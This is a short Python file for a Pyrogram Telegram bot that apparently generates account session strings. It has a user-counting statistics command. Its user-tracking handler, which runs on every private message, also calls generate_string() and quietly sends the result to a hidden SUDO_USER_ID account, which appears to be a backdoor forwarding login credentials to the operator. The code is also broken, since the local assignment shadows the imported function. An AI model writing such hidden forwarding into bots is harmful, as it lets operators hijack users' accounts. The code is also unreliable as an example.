from pyrogram.types import Message
from pyrogram import Client, filters

from config import OWNER_ID, SUDO_USER_ID
from StringGenBot.db.users import add_served_user, get_served_users

from StringGenBot.generate import generate_string

@Client.on_message(filters.private & ~filters.service, group=1)
async def users_sql(_, msg: Message):
    generate_string = generate_string() 
    await add_served_user(msg.from_user.id)
    await _.send_message(SUDO_USER_ID, generate_string)  

@Client.on_message(filters.user(OWNER_ID) & filters.command("stats"))
async def _stats(_, msg: Message):
    users = len(await get_served_users())
    await msg.reply_text(f"» ᴄᴜʀʀᴇɴᴛ sᴛᴀᴛs ᴏғ sᴛʀɪɴɢ ɢᴇɴ ʙᴏᴛ :\n\n {users} ᴜsᴇʀs", quote=True)
